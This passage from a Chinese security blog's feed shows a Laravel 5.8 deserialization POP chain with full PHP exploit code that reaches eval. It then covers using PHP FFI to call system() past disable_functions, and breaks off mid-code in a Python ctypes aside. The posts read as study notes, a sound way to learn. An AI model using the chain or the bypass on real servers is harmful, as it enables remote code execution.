&lt;p>然后接着找适合做&lt;code>call_user_func()&lt;/code>第一个参数的类，它需要可以执行任意函数 vendor/mockery/mockery/library/Mockery/Loader/EvalLoader.php&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211204135811389.png" alt="image-20211204135811389">&lt;/p>
&lt;p>这个&lt;code>load()&lt;/code>可以直接调用eval执行代码，但是&lt;code>$defination&lt;/code>要满足if的判断，跟进&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211204140231175.png" alt="image-20211204140231175">&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211204140248303.png" alt="image-20211204140248303">&lt;/p>
&lt;p>需要额外再找两个类，第一个类具有&lt;code>code&lt;/code>属性，第二类又&lt;code>getName&lt;/code>函数，来作为第一个类的config属性&lt;/p>
&lt;p>可用的第一个类就是&lt;code>getClassName()&lt;/code>所在的类 vendor/mockery/mockery/library/Mockery/Generator/MockDefinition.php&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211204140502311.png" alt="image-20211204140502311">&lt;/p>
&lt;p>第二个是 vendor/nikic/php-parser/lib/PhpParser/Node/Scalar/MagicConst/Line.php&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211204140537312.png" alt="image-20211204140537312">&lt;/p>
&lt;p>总结以上的过程，写exp&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-php" data-lang="php">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#75af00">php&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">namespace&lt;/span> &lt;span style="color:#75af00">PhpParser\Node\Scalar\MagicConst&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Line&lt;/span> &lt;span style="color:#111">{}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">namespace&lt;/span> &lt;span style="color:#75af00">Mockery\Generator&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">MockDefinition&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">protected&lt;/span> &lt;span style="color:#111">$config&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">protected&lt;/span> &lt;span style="color:#111">$code&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#111">__construct&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$config&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">$code&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">config&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">$config&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">code&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">$code&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">namespace&lt;/span> &lt;span style="color:#75af00">Mockery\Loader&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">EvalLoader&lt;/span>&lt;span style="color:#111">{}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">namespace&lt;/span> &lt;span style="color:#75af00">Illuminate\Bus&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Dispatcher&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">protected&lt;/span> &lt;span style="color:#111">$queueResolver&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#111">__construct&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$queueResolver&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">queueResolver&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">$queueResolver&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">namespace&lt;/span> &lt;span style="color:#75af00">Illuminate\Foundation\Console&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">QueuedCommand&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#111">$connection&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#111">__construct&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$connection&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">connection&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">$connection&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">namespace&lt;/span> &lt;span style="color:#75af00">Illuminate\Broadcasting&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">PendingBroadcast&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">protected&lt;/span> &lt;span style="color:#111">$events&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">protected&lt;/span> &lt;span style="color:#111">$event&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#111">__construct&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$events&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">$event&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">events&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">$events&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">event&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">$event&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">namespace&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">$line&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">PhpParser\Node\Scalar\MagicConst\Line&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">$mockdefinition&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">Mockery\Generator\MockDefinition&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$line&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#d88200">&amp;#39;&amp;lt;?php phpinfo();?&amp;gt;&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">$evalloader&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">Mockery\Loader\EvalLoader&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">$dispatcher&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">Illuminate\Bus\Dispatcher&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#00a8c8">array&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$evalloader&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#d88200">&amp;#39;load&amp;#39;&lt;/span>&lt;span style="color:#111">));&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">$queuedcommand&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">Illuminate\Foundation\Console\QueuedCommand&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$mockdefinition&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">$pendingbroadcast&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">Illuminate\Broadcasting\PendingBroadcast&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$dispatcher&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#111">$queuedcommand&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">echo&lt;/span> &lt;span style="color:#75af00">urlencode&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">serialize&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$pendingbroadcast&lt;/span>&lt;span style="color:#111">));&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">?&amp;gt;&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">
&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>执行效果（盖了一层laravel报错的底色哈哈哈哈哈哈哈&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211204140752165.png" alt="image-20211204140752165">&lt;/p>
&lt;p>这个链子非常的长，涉及到6个类&lt;/p>
&lt;hr>
&lt;p>pop链杀我！！！看代码有种目害的感觉了&lt;/p>
&lt;hr>
&lt;details>
&lt;summary>
&lt;h4 class="inline">
以下是本文中涉及到的 和我学习时看过的所有文章的链接🔗 每日感谢互联网的丰富资源（
&lt;/h4>
&lt;/summary>
&lt;p>&lt;a href="https://hachp1.github.io/posts/Web%E5%AE%89%E5%85%A8/20190906-laravel_pop1.html#%E5%A4%8D%E7%8E%B0-1">Laravel POP链简析 &lt;/a> | &lt;a href="https://xz.aliyun.com/t/5911">Laravel5.8.x反序列化POP链&lt;/a>&lt;/p>
&lt;/details></description></item><item><title>FFI绕过disable_functions</title><link>https://amiaaaz.github.io/2021/12/03/use-ffi-bypass-disable-functions/</link><pubDate>Fri, 03 Dec 2021 00:01:07 +0800</pubDate><guid>https://amiaaaz.github.io/2021/12/03/use-ffi-bypass-disable-functions/</guid><description>&lt;p>废话不多说，直接进入正题；文中参考链接统一扔后面了&lt;/p>
&lt;h2 id="preloading">Preloading&lt;/h2>
&lt;ul>
&lt;li>&lt;a href="https://wiki.php.net/rfc/preload">PHP RFC: Preloading&lt;/a> | php7.4启用&lt;/li>
&lt;/ul>
&lt;p>预加载文件到opcache中，类不能有不可达的父类、接口，also only top-level entities are not nested with control structures (e.g. if()&amp;hellip;)may be preloaded；被加载后除非重启，进行的修改不影响当前进程；预加载不影响静态类成员和变量的表现；Windows中不能预加载从内部继承的类（Windows ASLR and absence of fork() don&amp;rsquo;t allow to guarantee the same addresses of internal classes in different processes.）；多版本有可能造成bug&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211202161008294.png" alt="image-20211202161008294">&lt;/p>
&lt;h2 id="ffi">FFI&lt;/h2>
&lt;ul>
&lt;li>&lt;a href="https://wiki.php.net/rfc/ffi">PHP RFC: FFI - Foreign Function Interface&lt;/a> | php7.4启用&lt;/li>
&lt;/ul>
&lt;p>文档中给了一个小栗子&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-php" data-lang="php">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#75af00">php&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// create FFI object, loading libc and exporting function printf()
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#111">$ffi&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">FFI&lt;/span>&lt;span style="color:#f92672">::&lt;/span>&lt;span style="color:#75af00">cdef&lt;/span>&lt;span style="color:#111">(&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#d88200">&amp;#34;int printf(const char *format, ...);&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75715e">// this is regular C declaration
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#d88200">&amp;#34;libc.so.6&amp;#34;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// call C printf()
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#111">$ffi&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">printf&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Hello %s!&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;world&amp;#34;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>直接运行即可输出Hello world!；这个函数的原型是这样的&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-php" data-lang="php">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">FFI&lt;/span>&lt;span style="color:#f92672">::&lt;/span>&lt;span style="color:#75af00">cdef&lt;/span>&lt;span style="color:#111">([&lt;/span>&lt;span style="color:#75af00">string&lt;/span> &lt;span style="color:#111">$cdef&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;&amp;#34;&lt;/span> &lt;span style="color:#111">[,&lt;/span> &lt;span style="color:#75af00">string&lt;/span> &lt;span style="color:#111">$lib&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#111">]])&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#75af00">FFI&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>书写的形式相当的简洁，创建FFI对象（声明）-&amp;gt;调用c方法；试着直接执行一个whoami&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>php -r &lt;span style="color:#d88200">&amp;#39;$ffi = FFI::cdef(&amp;#34;int system(char *command);&amp;#34;);$ffi-&amp;gt;system(&amp;#34;whoami&amp;#34;);&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>发现在没有第二个参数的情况下也可以正常执行system函数，看下&lt;a href="https://github.dev/php/php-src/blob/d29e93870ab2141e8a38cccefb81553f0b16cbfe/ext/ffi/ffi.c#L2853-L2879">源码&lt;/a>&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211202231908072.png" alt="image-20211202231908072">&lt;/p>
&lt;p>这种情况下lib=NULL，handle=RTLD_DEFAULT（这个注释TODO就很灵性）&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211202232422896.png" alt="image-20211202232422896">&lt;/p>
&lt;p>随后调用&lt;code>DL_FETCH_SYMBOL&lt;/code>，&lt;a href="https://github.dev/php/php-src/blob/d29e93870ab2141e8a38cccefb81553f0b16cbfe/Zend/zend_portability.h#L166-L168">也就是&lt;/a>dlsysm&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211202232601190.png" alt="image-20211202232601190">&lt;/p>
&lt;blockquote>
&lt;p>&lt;strong>RTLD_DEFAULT&lt;/strong>&lt;/p>
&lt;p>Find the first occurrence of the desired symbol using the default shared object search order. The search will include global symbols in the executable and its dependencies, as well as symbols in shared objects that were dynamically loaded with the &lt;strong>RTLD_GLOBAL&lt;/strong>flag.&lt;/p>
&lt;/blockquote>
&lt;p>当dlsym第一个参数为RTLD_DEFAULT时，会按照默认共享库顺序查找system的位置，搜索范围还包括了可执行程序极其依赖中的函数表（如果设置了 RTLD_GLOBAL还会搜索动态加载库中的函数表），也就是直接在全局符号表里找了，所以不需要指定加载库，fopen这类函数也是一样&lt;/p>
&lt;p>更多的栗子请参见&lt;a href="https://wiki.php.net/rfc/ffi">文档&lt;/a>和&lt;a href="https://www.laruence.com/2020/03/11/5475.html">这一篇文章&lt;/a>，写的都很详细&lt;/p>
&lt;h3 id="跑个题ffi-in-python">跑个题：FFI in Python&lt;/h3>
&lt;p>Python的优点就不必说了，缺点是封装太好了导致运行速度上不去，那为什么不直接在Python中用C/C++呢？&lt;/p>
&lt;p>肥肠不错的想法！不过要解决的有两个问题：Marshalling（感觉编组这个翻译很奇怪 但是这个行为可以类比一下serialize） &amp;amp; Manageing Memory（内存管理）&lt;/p>
&lt;ul>
&lt;li>Python中万物皆object，而C中有严格的int float等等类型&lt;/li>
&lt;li>Python有gc，而C中需要手动malloc&lt;/li>
&lt;/ul>
&lt;p>不过不急，已经有库封装好了这些功能可以直接使用，来康康demo&lt;/p>
&lt;h4 id="ctypes库">ctypes库&lt;/h4>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-c" data-lang="c">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#include&lt;/span> &lt;span style="color:#75715e">&amp;lt;stdio.h&amp;gt;&lt;/span>&lt;span style="color:#75715e">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">float&lt;/span> &lt;span style="color:#75af00">cadd&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#00a8c8">int&lt;/span> &lt;span style="color:#111">x&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#00a8c8">float&lt;/span> &lt;span style="color:#111">y&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">float&lt;/span> &lt;span style="color:#111">res&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">x&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">y&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">printf&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;In cadd: int %d float %.1f returning %.1f&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">x&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">y&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">res&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">res&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">ctypes&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">pathlib&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">__name__&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#d88200">&amp;#34;__main__&amp;#34;&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e"># load the lib&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">libname&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">pathlib&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">Path&lt;/span>&lt;span style="color:#111">()&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">absolute&lt;/span>&lt;span style="color:#111">()&lt;/span> &lt;span style="color:#f92672">/&lt;/span> &lt;span style="color:#d88200">&amp;#34;libcadd.so&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">c_lib&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">ctypes&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">CDLL&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">libname&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">x&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">y&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">6&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#ae81ff">2.3&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e"># define the return type&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">c_lib&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">cadd&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">restype&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">ctypes&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">c_float&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e"># call the function with the correct argument types&lt;/span>
